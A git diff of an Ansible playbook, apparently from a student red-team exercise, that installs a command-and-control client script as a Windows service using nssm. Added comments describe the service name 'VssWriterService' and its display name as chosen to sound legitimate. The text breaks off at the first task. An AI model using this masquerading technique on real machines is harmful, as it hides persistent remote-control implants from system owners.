@@ -1,13 +1,16 @@
 ---
+# Matt Sisco
+
 -   name: Deploy script as Service
     hosts: all
     vars:
-      service_name: "VssWriterService"
+      service_name: "VssWriterService" # Legit sounding Name of the service to be created
+      service_display_name: "VssWriter Service" # Legit sounding Display name for the service
       service_directory: "C://Windows/Vss/Writers/VssWriter/"
       service_script: "{{ service_directory }}\\VssWriter.py"
       local_file: "/home/redteam/310Infragroup7nyameow/Matt_tool/c2_programs/Client_C2.py"
       nssm_exe: "{{ service_directory }}\\nssm.exe"
-      local_nssm: "/home/redteam/310Infragroup7nyameow/Matt_tool/nssm1.exe"
+      local_nssm: "/home/redteam/310Infragroup7nyameow/Matt_tool/source/nssm1.exe"
 
     tasks:
       - name: Make sure the directory exists
